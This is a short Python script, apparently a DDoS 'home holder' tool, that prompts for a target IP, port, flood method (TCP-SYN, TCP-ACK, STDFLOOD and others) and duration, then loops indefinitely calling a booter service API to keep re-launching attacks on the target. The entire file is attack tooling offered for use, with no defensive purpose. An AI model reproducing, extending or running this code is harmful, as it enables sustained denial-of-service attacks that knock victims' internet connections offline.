from time import sleep
import requests
import os
import random

def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

clear()

print("Auto Home Holder --> made by /dev/null#5151\n\n")

methods = ["STDFLOOD", "TCP-FRAG", "TCP-ACK", "TCP-STOMP", "TCP-SYN"]

ipaddr = input("IP: ")
port = int(input("Port: "))
method = input("Method: ")
time = int(input("Time: "))

api_key = '' # API Key if none leave empty
api_url = 'api.php?key={}&host={}&port={}&method={}&time={}'.format(api_key, ipaddr, port, method.upper(), time) # Surly you know what this is

headers = requests.utils.default_headers()

headers.update(
    {
        'User-Agent': '0x HH 1.0' # lol
    }
)

if method.upper() not in methods:
    print("Invalid Method")
    exit()

lcount = 0

while True:
    lcount +=1
    clear()
    print("Sending attack to {} for {} seconds --> Loop Count: {}\n\n".format(ipaddr, time, lcount))
    response = requests.get(api_url, headers=headers)
    data = response.text
    print(data)

    sleep(time+5)
    print("\nAttack has finished --> waiting between 30 and 40 seconds")
    sleep(random.uniform(30, 40))
